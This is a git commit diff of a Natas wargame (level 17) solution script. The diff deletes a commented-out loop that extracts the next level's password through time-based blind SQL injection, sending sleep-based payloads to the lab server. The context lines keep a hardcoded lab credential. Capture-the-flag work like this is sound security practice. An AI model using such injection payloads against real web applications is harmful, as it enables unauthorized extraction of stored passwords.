e9ffad9535a55ae4c2ad6560977d414271f75634
dotiendat97 <38005847+dotiendat97@users.noreply.github.com>
2018-09-05 20:37:45 +0700

    Update natas17.py

--- natas17.py
+++ natas17.py
@@ -5,39 +5,6 @@ import time
 passwd = ''
 auth = 'Basic ' + base64.b64encode('natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
 
-# for i in range(1,33):
-	# st = 48
-	# en = 122
-	# while(True):
-		# mid = (st + en) / 2
-		# Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))='+str(mid)+',sleep(2),sleep(0))-- -'}
-		# t = time.time()
-		# r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
-		# t = time.time() - t
-		# print str(t)+" "+str(mid)
-		# if t > 2:
-			# Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))='+str(mid)+',sleep(2),sleep(0))-- -'}
-			# t = time.time()
-			# r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
-			# t = time.time() - t
-			# if t > 2:
-				# passwd += chr(mid)
-				# print "Password: " + passwd
-				# break
-		# Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))>'+str(mid)+',sleep(2),sleep(0))-- -'}
-		# t = time.time()
-		# r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
-		# t = time.time() - t
-		# if t > 2:
-			# Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))>'+str(mid)+',sleep(2),sleep(0))-- -'}
-			# t = time.time()
-			# r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
-			# t = time.time() - t
-			# if t > 2:
-				# st= mid + 1
-			# else:
-				# en = mid -1
-		
 
 exists = ''
 chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"	
